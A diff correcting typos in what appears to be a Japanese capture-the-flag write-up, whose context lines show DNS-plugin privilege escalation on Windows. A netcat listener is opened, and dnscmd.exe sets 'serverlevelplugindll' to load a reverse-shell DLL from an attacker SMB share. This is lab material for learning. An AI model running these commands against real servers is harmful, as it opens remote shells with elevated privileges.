@@ -132,7 +132,7 @@ dns
         READ_CONTROL
 ```
 
-DNSの設定および再起動ができる権限があるので、DNSの"serverlevelplugindll"というパラメータにリバースシェルを起動するようなdllファイルを読み込ませる酔うに設定してやる。
+DNSの設定および再起動ができる権限があるので、DNSの"serverlevelplugindll"というパラメータにリバースシェルを起動するようなdllファイルを読み込ませるように設定してやる。
 
 dllの作成：
 
@@ -155,7 +155,7 @@ dllの作成：
 └─$ rlwrap nc -nvlp 443
 ```
 
-次にWindows側でDNSの設定をする。以下のように先に作成したdllをしていする：
+次にWindows側でDNSの設定をする。以下のように先に作成したdllを指定する：
 
 ```
 *Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.16.4\kali\rev.dll
